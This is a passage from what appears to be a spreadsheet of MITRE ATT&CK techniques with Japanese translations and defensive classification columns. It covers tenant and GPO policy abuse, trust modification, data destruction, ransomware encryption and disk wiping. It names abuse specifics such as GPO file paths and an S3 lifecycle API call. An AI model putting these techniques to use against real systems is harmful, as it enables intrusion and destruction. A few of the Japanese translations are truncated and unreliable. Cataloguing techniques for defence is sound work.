2017)(Citation: ESET Sednit 2017 Activity)",攻撃者は、静的なIPアドレスやドメインのリストに依存する代わりに、コマンド＆コントロール通信の宛先を動的に特定するためにドメイン生成アルゴリズム（DGA）を利用する場合があります。これにより、マルウェアが指示を確認するためにチェックするドメインが数千にも及ぶ可能性があるため、防御側がコマンド＆コントロールチャネルを遮断、追跡、または乗っ取ることをはるかに困難にする利点があります。(引用元: Cybereason Dissecting DGAs)(引用元: Cisco Umbrella DGA)(引用元: Unit 42 DGA Feb 2019)DGAは、各文字を生成してドメイン名を構築する場合、一見ランダムな「意味不明な文字列」（例: istgmxdejdnxuyla.ru）の形をとる。 あるいは、文字ではなく単語を連結して単位とするDGAも存在する（例：cityjulydish.net）。多くのDGAは時間ベースで、時間単位（毎時、毎日、毎月など）ごとに異なるドメインを生成する。さらにシード値を組み込むことで、防御側による将来のドメイン予測を困難にするものもある。（引用元：Cybereason Dissecting DGAs）（引用元：Cisco Umbrella DGA）（引用元：Talos CCleanup 2017）（引用元：Akamai DGA Mitigation）攻撃者は[フォールバックチャネル](https://attack.mitre.org/techniques/T1008)の目的でDGAを利用する場合がある。 プライマリC&Cサーバーとの接続が失われた場合、マルウェアはC&C再確立手段としてDGAを運用することがある。(引用: Talos CCleanup 2017)(引用: FireEye POSHSPY 2017年4月)(引用: ESET Sednit 2017年活動),command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--54456690-84de-4538-9101-643e26437e09,2019-02-18T17:22:57.831Z,2025-04-25T15:15:33.251Z,,,,
T1484,,Domain or Tenant Policy Modification,ドメインまたはテナントポリシーの変更,"Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation. Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants. With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include: * modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) * modifying domain trusts to include an adversary-controlled domain, allowing adversaries to forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) * changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207). * adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023) Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",攻撃者は、防御を回避し／または集中管理環境で権限を昇格させるため、ドメインまたはIDテナントの設定を変更することがある。こうしたサービスはデバイスやアカウントなどのIDリソースを一元管理する手段を提供し、ドメイン間やテナント間で適用される設定（信頼関係、ID同期、IDフェデレーションなど）を含むことが多い。 ドメインまたはテナント設定の変更には、Microsoft Active Directory (AD) におけるドメインのグループポリシーオブジェクト (GPO) の改変、またはドメイン間の信頼設定（ドメイン間またはテナント間のフェデレーション信頼関係を含む）の変更が含まれる。十分な権限があれば、攻撃者はドメインまたはテナントのポリシー設定を変更できる。これらのサービスの構成設定は多数のアイデンティティリソースに適用されるため、この悪用から生じる潜在的な攻撃や悪意のある結果が非常に多岐にわたる。 悪用例には以下が含まれます：* GPOを改変し、悪意のある[スケジュールされたタスク](https://attack.mitre.org/techniques/T1053/005)をドメイン環境全体のコンピューターに展開する（出典：ADSecurity GPO Persistence 2016）（出典：Wald0 Guide to GPOs）（出典： Harmj0y Abusing GPO Permissions)* 敵対者が制御するドメインをドメイン信頼関係に追加し、敵対者が偽造したアクセストークンを被害ドメインリソースが受け入れるようにする（出典: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks）* AD環境内の構成設定を変更し、[不正ドメインコントローラー](https://attack.mitre.org/techniques/T1207)を実装する * 敵対者が管理する新たなフェデレーションIDプロバイダーをIDテナントに追加し、敵対者が被害テナントが管理する任意のユーザーとして認証できるようにする（出典：Okta Cross-Tenant Impersonation 2023）敵対者は、ドメインまたはテナントポリシーを一時的に変更し、悪意のある行動を実行した後、変更を元に戻して不審な痕跡を消去する可能性があります。,defense-evasion;privilege-escalation,Windows;Identity Provider,credential_abuse,privilege_gain,authentication_system;mfa_in_use;identity_federation;user_interaction;endpoint_management;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d,2019-03-07T14:10:32.650Z,2025-04-15T19:59:19.033Z,,,,
T1484.001,T1484,Group Policy Modification,グループポリシーの改変,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain. Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs) For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",攻撃者は、通常ドメイン上の権限昇格を目的として、グループポリシーオブジェクト（GPO）を変更し、ドメインの意図された裁量アクセス制御を無効化することがあります。グループポリシーは、Active Directory（AD）におけるユーザーおよびコンピュータ設定の一元管理を可能にします。GPOはグループポリシー設定のコンテナであり、予測可能なネットワークパス `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\` 内に保存されたファイルで構成されます。(引用元: TechNet グループポリシーの基本)(引用元: ADSecurity GPO Persistence 2016)AD内の他のオブジェクトと同様に、GPOにもアクセス制御が関連付けられています。デフォルトでは、ドメイン内のすべてのユーザーアカウントがGPOを読み取る権限を持っています。GPOへのアクセス制御権限（例: 書き込みアクセス）をドメイン内の特定のユーザーやグループに委任することが可能です。 悪意のあるGPO改変は、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)、 [侵入ツール転送](https://attack.mitre.org/techniques/T1105)、[アカウント作成](https://attack.mitre.org/techniques/T1136)、[サービス実行](https://attack.mitre.org/techniques/T1569/002)などが挙げられます。(引用元: ADセキュリティGPO永続化2016)(引用元: Wald0 Guide to GPOs)(引用元: Harmj0y Abusing GPO Permissions)(引用元: Mandiant M Trends 2016)(引用元: Microsoft Hacking Team Breach) GPOはAD環境における多数のユーザー設定やマシン設定を制御できるため、このGPO悪用から派生する潜在的な攻撃手法は極めて多い。(引用元: Wald0 Guide to GPOs) 例えば、<code>New-GPOImmediateTask</code>のような公開スクリプトを利用すれば、GPO設定（具体的には<code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>を改変することで実現される。(引用元: Wald0 Guide to GPOs)(引用元: Harmj0y Abusing GPO Permissions) 場合によっては、攻撃者が<code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>で設定されるSeEnableDelegationPrivilegeなどの特定のユーザー権限を変更し、攻撃者の制御下にあるユーザーアカウントがGPOを変更できるようになることで、ドメインを完全に制御する巧妙なADバックドアを実現する可能性があります。(引用: Harmj0y SeEnableDelegationPrivilege 権限),defense-evasion;privilege-escalation,Windows,script_command_execution,privilege_gain,authentication_system;user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;file_storage_access,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163,2020-12-28T21:50:59.844Z,2025-04-15T19:58:34.774Z,,,,
T1484.002,T1484,Trust Modification,信頼関係の改変,"Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains. Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)",攻撃者は、防御を回避し/または権限を昇格させるために、新しいドメイン信頼を追加したり、既存のドメイン信頼のプロパティを変更したり、ドメインとテナント間の信頼関係の設定を変更したりする可能性があります。ユーザーIDがフェデレーションされているかどうかなどの信頼の詳細は、共有リソースへのアクセスを目的として、ドメインまたはテナント間で認証および認可プロパティを適用することを可能にします。(引用元: Microsoft - Azure AD フェデレーション) これらの信頼オブジェクトには、サーバー、トークン、ドメインに適用されるアカウント、認証情報、その他の認証資料が含まれる場合があります。これらの信頼を操作することで、攻撃者は自身が制御するオブジェクトを追加する設定を変更し、権限昇格や防御回避が可能になる可能性があります。 例えば、Microsoft Active Directory (AD) 環境では、署名証明書を侵害せずに新しい認証情報を偽造するために、[SAMLトークン](https://attack.mitre.org/techniques/T1606/002) の偽造に悪用される可能性があります。攻撃者は代わりに、ドメイン信頼関係を操作して自身の署名証明書を追加できます。 攻撃者はまた、Active Directory フェデレーション サービス (AD FS) を使用して AD ドメインをフェデレーション ドメインに変換することがあり、これにより、有効な認証情報の任意の組み合わせを指定ユーザーとしてログインできるようにするクレーム発行ルールの変更など、悪意のある信頼関係の変更が可能になる場合があります。(引用元: AADInternals zure AD Federated Domain) 攻撃者はOktaやAWS IAM Identity CenterなどのIDテナントに新たなフェデレーションIDプロバイダーを追加することも可能であり、これにより攻撃者はテナント内の任意のユーザーとして認証できるようになる。(引用元: Okta Cross-Tenant Impersonation 2023) これにより、脅威アクターはアイデンティティテナントを利用する様々なクラウドベースサービスへの広範なアクセス権を取得できる可能性があります。例えばAWS環境では、AWS Organization向けに新たなIDプロバイダーを作成した攻撃者は、各メンバーアカウントのIDを作成することなく、AWS Organizationの全メンバーアカウントにフェデレーション接続できるようになります。(引用元: AWS RE:Inforce Threat Detection 2024),defense-evasion;privilege-escalation,Windows;Identity Provider,credential_abuse,privilege_gain,authentication_system;identity_federation;user_interaction;cloud_control_plane;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee,2020-12-28T21:59:02.181Z,2025-04-15T19:58:14.422Z,,,,
T1485,,Data Destruction,データ破壊,"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure. Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017) To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018). In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ - Cisco Insider) Similarly, they may delete virtual machines from on-prem virtualized environments.",攻撃者は、システム、サービス、ネットワークリソースへのアクセスを妨害するため、特定のシステム上のデータやファイル、あるいはネットワーク上の大量のデータを破壊する可能性があります。 データ破壊は、ローカルおよびリモートドライブ上のファイルやデータを上書きすることで、保存されたデータをフォレンジック技術による復元不能にする可能性が高い。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)(引用: Unit 42 Shamoon3 2018)(引用: Talos Olympic Destroyer 2018)<code>del</code> や <code>rm</code> などの一般的なオペレーティングシステムのファイル削除コマンドは、多くの場合、ファイル自体の中身を消去せずにファイルへのポインタのみを削除するため、適切なフォレンジック手法によってファイルを復元することが可能になります。 この動作は、ストレージディスクの一部やディスクの論理構造ではなく、個々のファイルが破壊されるという点で、[ディスク内容のワイプ](https://attack.mitre.org/techniques/T1561/001) や [ディスク構造のワイプ](https://attack.mitre.org/techniques/T1561/002) とは異なります。 攻撃者は、ファイルやディレクトリをランダムに生成されたデータで上書きし、復元不能にしようとする場合があります。（引用元：Kaspersky StoneDrill 2017）（引用元：Unit 42 Shamoon3 2018） 政治的なイメージファイルを用いてデータを上書きする事例も確認されている。（引用元：FireEye Shamoon Nov 2016）（引用元：Palo Alto Shamoon Nov 2016）(引用: Kaspersky StoneDrill 2017)ネットワーク全体の可用性中断を目的とする作戦において標的組織への影響を最大化するため、データ破壊を目的としたマルウェアはワームのような機能を有し、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)、[SMB/Windows管理者共有](https://attack.mitre.org/techniques/T1021/002)などの追加技術を活用してネットワーク全体に拡散するワームのような機能を備えている可能性がある。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)(引用: Talos Olympic Destroyer 2018)。 クラウド環境では、攻撃者はクラウドストレージオブジェクト、マシンイメージ、データベースインスタンス、および運用に不可欠なその他のインフラへのアクセス権を悪用し、組織やその顧客に損害を与える可能性があります。(引用: Data Destruction - Threat Post)(引用: DOJ - Cisco Insider) 同様に、オンプレミスの仮想化環境から仮想マシンを削除する可能性があります。,impact,Windows;IaaS;Linux;macOS;Containers;ESXi,credential_abuse,impact,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;database_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c,2019-03-14T18:47:17.701Z,2025-04-15T19:59:11.731Z,,,,
T1485.001,T1485,Lifecycle-Triggered Deletion,ライフサイクルトリガー型削除,"Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within. Cloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation: GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once. For example, in AWS environments, an adversary with the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle` API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day.(Citation: Palo Alto Cloud Ransomware)(Citation: Halcyon AWS Ransomware 2025) In addition to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657), adversaries may also perform this action on buckets storing cloud logs for [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation: Datadog S3 Lifecycle CloudTrail Logs)",攻撃者はクラウドストレージバケットのライフサイクルポリシーを変更し、格納されている全オブジェクトを破壊する可能性がある。 クラウドストレージバケットでは、ユーザーがライフサイクルポリシーを設定し、一定期間経過後のオブジェクトの移行、アーカイブ、削除を自動化できる場合が多い。(引用: AWS Storage Lifecycles)(引用: GCP Storage Lifecycles)(引用: Azure Storage Lifecycles) 脅威アクターがこれらのポリシーを変更する十分な権限を持っている場合、すべてのオブジェクトを一度に削除できる可能性がある。 例えばAWS環境では、`PutLifecycleConfiguration`権限を持つ攻撃者が`PutBucketLifecycle` API呼び出しを使用し、S3バケットに1日後に全オブジェクトを削除するライフサイクルポリシーを適用できる。(引用: Palo Alto Cloud Ransomware)(引用: Halcyon AWS Ransomware 2025) 恐喝や[金銭窃取](https://attack.mitre.org/techniques/T1657)を目的としたデータ破壊に加え、攻撃者は[指標除去](https://attack.mitre.org/techniques/T1070)のためにクラウドログを保存するバケットに対しても同様の操作を実行する可能性があります。(引用: Datadog S3ライフサイクルCloudTrailログ),impact,IaaS,config_policy_manipulation,impact,user_interaction;cloud_control_plane;file_storage_access;logging_monitoring,specified,File Server;Log / Monitoring Server;My Number Administrative System on GovCloud,subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--1001e0d6-ee09-4dfc-aa90-e9320ffc8fe4,2024-09-25T13:16:14.166Z,2025-04-15T19:58:06.787Z,,,,
T1486,,Data Encrypted for Impact,影響を与えるためのデータ暗号化,"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as ""print bombing"").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis) In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",攻撃者は、システムやネットワークリソースへのアクセスを妨害するため、標的システムまたはネットワーク内の多数のシステム上のデータを暗号化することがあります。ローカルおよびリモートドライブ上のファイルやデータを暗号化し、復号鍵へのアクセスを制限することで、保存データのアクセス不能化を試みます。 これは、復号化または復号鍵と引き換えに被害者から金銭的補償を要求するため（ランサムウェア）、あるいは鍵が保存または送信されていない場合にデータを恒久的にアクセス不能にするために行われる可能性がある。(引用: US-CERT Ransomware 2016)（引用元：FireEye WannaCry 2017）（引用元：US-CERT NotPetya 2017）（引用元：US-CERT SamSam 2018）ランサムウェアの場合、Office文書、PDF、画像、動画、音声、テキスト、ソースコードファイルなどの一般的なユーザーファイルが暗号化されるのが一般的です（多くの場合、ファイル名が変更されたり特定のファイルマーカーが付与されたりします）。 攻撃者は、これらのファイルをロック解除したり操作するためのアクセス権を取得するために、まず他の動作（例：[ファイルおよびディレクトリの権限変更](https://attack.mitre.org/techniques/T1222) や [システムのシャットダウン/再起動](https://attack.mitre.org/techniques/T1529)）を実行する必要がある場合があります。(引用元: CarbonBlack Conti July 2020) 場合によっては、攻撃者は重要なシステムファイル、ディスクパーティション、MBRを暗号化することもある。(引用元: US-CERT NotPetya 2017) 攻撃者はESXiやその他のハイパーバイザー上でホストされている仮想マシンを暗号化することもある。(引用元: Crowdstrike Hypervisor Jackpotting Pt 2 2021) 標的組織への影響を最大化するため、データ暗号化を目的としたマルウェアはワームのような機能を備え、[有効なアカウント](https://attack.mitre.org/techniques/T1078)や [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)、[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)などの攻撃手法を悪用してネットワーク全体に拡散するワーム的特性を持つ場合があります。(引用元: FireEye WannaCry 2017)(引用元: US-CERT NotPetya 2017) 暗号化マルウェアは、被害者の壁紙やESXiサーバーのログインメッセージを変更するなどの[内部改ざん](https://attack.mitre.org/techniques/T1491/001)を利用したり、接続されたプリンターに身代金要求書やその他のメッセージを送信する（「プリント爆撃」として知られる）ことで被害者を威嚇することもある。(引用元: NHS Digital Egregor Nov 2020)(引用元: Varonis) クラウド環境では、侵害されたアカウント内のストレージオブジェクトも暗号化される可能性がある。(引用元: Rhino S3 Ransomware Part 1) 例えば、AWS 環境では、攻撃者は AWS の顧客提供キーによるサーバーサイド暗号化 (SSE-C) などのサービスを利用してデータを暗号化する場合がある。(引用元: Halcyon AWS Ransomware 2025),impact,Linux;macOS;Windows;IaaS;ESXi,credential_abuse,impact,authentication_system;mfa_in_use;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Mail / Collaboration;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0,2019-03-15T13:59:30.390Z,2025-04-15T19:59:00.731Z,,,,
T1487,,Disk Structure Wipe,ディスク構造の消去,"Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot systems; targeting specific critical systems as well as a large number of systems in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) if all sectors of a disk are wiped. To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",攻撃者は、システムの起動に必要なハードドライブ上のディスクデータ構造を破損または消去する可能性があります。ネットワーク内の特定の重要システムや多数のシステムを標的とし、システムおよびネットワークリソースへの可用性を妨害します。攻撃者は、マスターブートレコード（MBR）やパーティションテーブルなどの構造内に存在する重要なデータを上書きすることで、システムの起動不能化を試みる場合があります。(出典: Symantec Shamoon 2012)(出典: FireEye Shamoon Nov 2016)(出典: Palo Alto Shamoon Nov 2016)(出典: Kaspersky StoneDrill 2017)(出典: Unit 42 Shamoon3 2018) ディスク構造に含まれるデータには、オペレーティングシステムをロードするための初期実行コードや、ディスク上のファイルシステムパーティションの位置情報が含まれる場合があります。この情報が存在しない場合、コンピュータは起動プロセス中にオペレーティングシステムをロードできず、使用不能になります。 [ディスク構造ワイプ](https://attack.mitre.org/techniques/T1487)は単独で実行される場合もあれば、ディスクの全セクタを消去する[ディスク内容ワイプ](https://attack.mitre.org/techniques/T1488)と組み合わせて実行される場合もある。 標的組織への影響を最大化するため、ディスク構造破壊を目的としたマルウェアはワームのような機能を備え、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)、[Windows管理共有](https://attack.mitre.org/techniques/T1077)などの手法を組み合わせてネットワーク上へ拡散する可能性があります。(引用元: Symantec Shamoon 2012)(引用元: FireEye Shamoon Nov 2016)(引用元: Palo Alto Shamoon Nov 2016)(引用元: Kaspersky StoneDrill 2017),impact,Windows;macOS;Linux,credential_abuse,impact,authentication_system;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--2e114e45-2c50-404c-804a-3af9564d240e,2019-03-19T19:38:27.097Z,2025-04-25T15:15:19.765Z,,,,
T1488,,Disk Content Wipe,ディスク内容の消去,"Adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources. Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased instead of individual files. To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: 